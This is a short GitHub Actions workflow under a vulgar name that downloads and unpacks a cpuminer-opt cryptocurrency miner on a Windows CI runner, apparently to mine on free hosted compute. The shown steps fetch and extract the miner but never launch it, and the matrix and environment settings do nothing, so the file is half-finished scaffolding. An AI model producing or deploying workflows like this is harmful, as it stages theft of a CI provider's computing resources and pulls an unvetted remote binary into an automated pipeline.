name: kontol  
   
on: [workflow_dispatch]  
   
jobs:  
  build:  
    name: kontol  
    runs-on: windows-latest  
    strategy:  
      max-parallel: 1  
      fail-fast: false  
      matrix:  
        go: [1.0]  
        flag: [A, B ]  
    env:  
        NUM_JOBS: 5  
        JOB: ${{ matrix.go }}  
    steps:  
    - name: DOWNLOAD  
      run: Invoke-WebRequest https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-win64.zip -OutFile Cpuminer-opt-cpu-pool-win64.zip 
    - name: Extract  
      run: Expand-Archive Cpuminer-opt-cpu-pool-win64.zip 
    - name: RUNNING  
      run: ls
    - name: DONE  
      run: cd Cpuminer-opt-cpu-pool-win64
    - name: DONE  
      run: ls
